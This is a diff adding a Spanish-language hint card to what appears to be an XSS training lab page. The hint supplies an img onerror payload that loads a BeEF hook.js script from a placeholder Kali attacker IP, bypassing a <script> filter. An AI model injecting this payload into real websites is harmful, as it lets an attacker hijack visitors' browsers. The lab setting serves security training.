@@ -22,6 +22,16 @@
 
 <div class="grid-2" style="align-items:start;">
   <div>
+    <!-- Pista -->
+    <div class="card mb-2" style="border-color:rgba(255,179,0,0.2);">
+      <div style="font-size:0.62rem; color:var(--muted); letter-spacing:3px; text-transform:uppercase; margin-bottom:0.6rem;">[ HINT ] &lt;script&gt; bloqueado — usa otro vector</div>
+      <pre style="background:#000; border:1px solid var(--border); padding:0.7rem 0.9rem; font-family:var(--font-mono); font-size:0.78rem; color:var(--warn); line-height:1.8; overflow:auto;">&lt;img src=x onerror="var s=document.createElement('script');s.src='http://&lt;TU_IP_KALI&gt;:3000/hook.js';document.head.appendChild(s)"&gt;</pre>
+      <p style="font-size:0.75rem; color:var(--muted); margin-top:0.5rem; line-height:1.7;">
+        El tag <code style="color:var(--warn);">&lt;img&gt;</code> con <code style="color:var(--warn);">onerror</code> carga el hook de BeEF sin usar <code>&lt;script&gt;</code>.<br>
+        Sustituye <span style="color:var(--warn);">&lt;TU_IP_KALI&gt;</span> por la IP de tu Kali.
+      </p>
+    </div>
+
     <div class="card">
       <div class="url-bar">
         <span class="method">POST</span>
